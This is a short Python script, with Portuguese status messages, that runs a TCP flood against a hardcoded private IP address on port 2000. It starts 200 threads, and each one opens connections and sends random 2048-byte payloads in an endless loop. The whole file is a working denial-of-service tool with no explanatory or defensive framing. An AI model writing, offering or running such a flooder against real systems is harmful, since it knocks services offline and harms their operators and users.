import random
import socket
import threading

def tcp_flooding():
	ip = "172.21.210.74"
	port = 2000
	data = random._urandom(2048)
	while True:
		try:			
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for i in range(2000):
				s.send(data)
			print("Pacote enviado!")
		except:
			s.close()
			print("Erro ao enviar pacotes!")

def main():
	for thread in range(200):
		th = threading.Thread(target = tcp_flooding)
		th.start()

if __name__ == "__main__":
    main()